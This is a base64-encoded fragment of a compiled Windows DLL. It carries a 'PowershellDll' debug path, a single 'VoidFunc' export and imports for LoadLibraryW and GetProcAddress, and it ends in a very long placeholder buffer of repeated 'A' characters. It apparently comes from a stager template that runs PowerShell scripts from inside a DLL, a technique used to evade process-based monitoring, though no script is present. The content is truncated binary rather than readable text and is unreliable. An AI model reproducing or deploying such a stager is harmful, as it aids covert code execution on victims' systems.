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5AF9pbml0dGVybV9lAEEAX3NlaF9maWx0ZXJfZGxsABkAX2NvbmZpZ3VyZV9uYXJyb3dfYXJndgAANQBfaW5pdGlhbGl6ZV9uYXJyb3dfZW52aXJvbm1lbnQAADYAX2luaXRpYWxpemVfb25leGl0X3RhYmxlAAA+AF9yZWdpc3Rlcl9vbmV4aXRfZnVuY3Rpb24AJABfZXhlY3V0ZV9vbmV4aXRfdGFibGUAHwBfY3J0X2F0ZXhpdAAXAF9jZXhpdAAAYXBpLW1zLXdpbi1jcnQtc3RkaW8tbDEtMS0wLmRsbABhcGktbXMtd2luLWNydC1oZWFwLWwxLTEtMC5kbGwAAGFwaS1tcy13aW4tY3J0LXJ1bnRpbWUtbDEtMS0wLmRsbABQAkdldExhc3RFcnJvcgAA0QNNdWx0aUJ5dGVUb1dpZGVDaGFyALIDTG9jYWxGcmVlAIIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABDBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAJAkdldEN1cnJlbnRQcm9jZXNzAGEFVGVybWluYXRlUHJvY2VzcwAAbQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AC0EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIACgJHZXRDdXJyZW50UHJvY2Vzc0lkAA4CR2V0Q3VycmVudFRocmVhZElkAADWAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAEsDSW5pdGlhbGl6ZVNMaXN0SGVhZABnA0lzRGVidWdnZXJQcmVzZW50AEYAbWVtY3B5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQBwAEAAAAAAKAAAAAAAAAAQAAoAAAAAA/////wAAAACxGb9ETuZAu3WYAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA